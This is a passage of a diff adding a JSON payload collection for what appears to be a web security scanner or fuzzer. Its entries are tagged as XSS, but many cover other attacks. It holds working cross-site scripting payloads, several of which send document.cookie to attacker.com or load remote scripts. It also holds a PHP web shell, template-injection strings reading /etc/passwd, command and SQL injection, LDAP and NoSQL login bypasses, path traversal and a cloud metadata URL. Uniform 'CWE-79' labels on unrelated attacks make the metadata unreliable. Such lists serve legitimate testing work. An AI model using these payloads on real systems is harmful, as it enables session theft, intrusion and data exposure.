+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.8dc8b04348",
+      "vector": "<script>document.getElementById('vulnerable').innerHTML=location.hash.slice(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.8e6aa344bf",
+      "vector": "<svg><script>alert(1337)</script></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.8eee319fab",
+      "vector": "<img src=x onerror=alert('attack')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.9127300273",
+      "vector": "<img src=x onerror=\"var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com/?c='+document.cookie);xhr.send()\">",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.91ccfcb465",
+      "vector": "<script>setTimeout('alert(1)',0)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.91d5b9d2c3",
+      "vector": "file://localhost/etc/passwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.922af0e0e4",
+      "vector": "<script>alert`1`</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.926744db48",
+      "vector": "<meta http-equiv=\"refresh\" content=\"0;url=http://attacker.com\">",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.95c392073d",
+      "vector": "<select autofocus onfocus=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.979c5b64b6",
+      "vector": "<svg><tspan oncopy=alert(1)>X</tspan></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.986d5caa34",
+      "vector": "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.9974f0b78e",
+      "vector": "<img src=x onerror=alert(0)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.99d343bde2",
+      "vector": "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.99f267a032",
+      "vector": "<iframe src=j&#x61;v&#x61;script:alert(1)></iframe>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "xss.legacy.9a4f3455c7",
+      "vector": "<select onfocus=alert(1) autofocus>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.9d50fa6ab4",
+      "vector": "<svg><script>alert('XSS')</script></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.9e1e2aa3a9",
+      "vector": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.9e86a00514",
+      "vector": "http://metadata.google.internal/computeMetadata/v1/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xss.legacy.9f40955472",
+      "vector": "<img src=x onerror=confirm(window.location)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.a05c53c9f1",
+      "vector": "<input onfocus=confirm(1) autofocus>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.a120033fe4",
+      "vector": "*()|&'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.a2a85ad4d8",
+      "vector": "%2e%2e%5c",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.a2e62c75be",
+      "vector": "<base href=\"http://attacker.com/\">",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.a32fe03175",
+      "vector": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.a583472161",
+      "vector": "</script><script>alert(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.a6438a4c6f",
+      "vector": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.a690e6509e",
+      "vector": "<body onpagehide=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.a6f1022a19",
+      "vector": "<svg><g onload=alert(1)></g></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.a78b422c62",
+      "vector": "<script>eval(location.hash.slice(1))</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.a8978b4232",
+      "vector": "//evil.com%00@example.com",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.ac33dcd52b",
+      "vector": "<?php system($_GET['cmd']); ?>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.acb56b5261",
+      "vector": "<style>body{background-image:url('javascript:alert(1)')}</style>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.acdab503ec",
+      "vector": "<video poster=javascript:alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ad76ffa071",
+      "vector": "<script>window.location.href='http://attacker.com/'+document.cookie</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ade1fcebc6",
+      "vector": "<object data=\"javascript:alert(1)\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ae20cd9cb6",
+      "vector": "<input onfocus=alert(1) autofocus>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.afb889d043",
+      "vector": "/redirect?next=javascript:alert(1)",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.b0b33545d3",
+      "vector": "<ScRiPt>alert(1)</ScRiPt>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b0c23bca44",
+      "vector": "<div onmouseover=alert(1)>Hover me</div>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b161a8a9f1",
+      "vector": "</title><script>alert(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b17fda1ae4",
+      "vector": "<body onstorage=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b1b84e510a",
+      "vector": "1' AND SLEEP(5)--",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "xss.legacy.b3386b415d",
+      "vector": "<input onfocus=alert(document.cookie) autofocus>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b50657df5c",
+      "vector": "<audio src=1 onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b629ee3539",
+      "vector": "<img src=x onerror=alert(document.URL)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b6d4f86c82",
+      "vector": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Struts2')}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.b840a0bfcb",
+      "vector": "<iframe src=javascript:alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b877634e3c",
+      "vector": "<script>$.ajax({url:'http://attacker.com',data:{cookie:document.cookie}})</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b8b1bd7170",
+      "vector": "<button onclick=confirm(1)>Click</button>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b8cdd93738",
+      "vector": "<img src=x onerror=alert(/XSS/.source)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.b8d29b095f",
+      "vector": "<textarea autofocus onfocus=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ba9469b2f9",
+      "vector": "....\\\\",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.bb1b3b5ddf",
+      "vector": "<keygen onfocus=alert(1) autofocus>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.bc78259c0a",
+      "vector": "\"><script>alert(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.bd7d8aa5eb",
+      "vector": "<body onunload=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.be2755b6ce",
+      "vector": "<script src=\"data:text/javascript,alert(1)\"></script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.bf234bdde2",
+      "vector": "<form action=http://attacker.com><input type=submit></form>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.bf4e1cf277",
+      "vector": "<iframe src='javascript:alert(document.domain)'></iframe>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.bf9587a2cc",
+      "vector": "<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.c05aeda05b",
+      "vector": "<svg><title onpointerenter=alert(1)>X</title></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.c146751e85",
+      "vector": "<body onpopstate=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.c1abf0d5bf",
+      "vector": "<keygen autofocus onfocus=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.c7ca481267",
+      "vector": "<svg><set attributeName=\"onload\" to=\"alert(1)\"></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.c84c6fee15",
+      "vector": "<script>a=alert;a(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.cac4633bfc",
+      "vector": "<table background=javascript:alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.cc22dde542",
+      "vector": "<form><button formaction=\"javascript:alert(1)\">CLICK</button></form>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.cc6265d3a1",
+      "vector": "<svg onload=fetch('http://attacker.com',{method:'POST',body:document.cookie})>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.cd7fc5ea7c",
+      "vector": "\";alert(1)//",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.ce12fe6d4a",
+      "vector": "http://evil.com@localhost",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.ce34f8c98b",
+      "vector": "`cat /etc/passwd`",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.ceab54db38",
+      "vector": "admin*",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.ceba72544a",
+      "vector": "<svg><title onpointerenter=confirm(1)>X</title></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.cf65b7e51e",
+      "vector": "<img src=x onerror=confirm(String.fromCharCode(88,83,83))>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.d08efff714",
+      "vector": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></script>\">'><script>alert(String.fromCharCode(88,83,83))</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.d0e7bb8cab",
+      "vector": "<form><button formaction=http://attacker.com>Click</button></form>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.d2627f78b0",
+      "vector": "<img src=x onerror=alert(parent)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.d4f55e293b",
+      "vector": "/redirect?url=//evil.com",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.d5d4716dec",
+      "vector": "file:///c:/windows/win.ini",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.d6a4f86777",
+      "vector": "../",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.d80848d376",
+      "vector": "<style>@import 'http://attacker.com/evil.css';</style>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.d81aff30ec",
+      "vector": "<img src=x onerror=alert(this.src)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.d81c52f513",
+      "vector": "</style><script>alert(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.d86078ecec",
+      "vector": "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.d8e46b2436",
+      "vector": "<script src=//attacker.com/evil.js></script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.da531c5fc8",
+      "vector": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.dbab4a221b",
+      "vector": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+      "description": "Imported from the legacy corpus (uri).",
+      "context": "uri",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.dc624a41ae",
+      "vector": "; ls",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.dd768f1682",
+      "vector": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.debd8740df",
+      "vector": "*)(uid=*)",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.df58248c41",
+      "vector": "*",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.df70f14cec",
+      "vector": "<body onresize=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.e0699c27a2",
+      "vector": "/var/www/html/.env",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.e1f8ae9b57",
+      "vector": "username[$ne]=null&password[$ne]=null",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
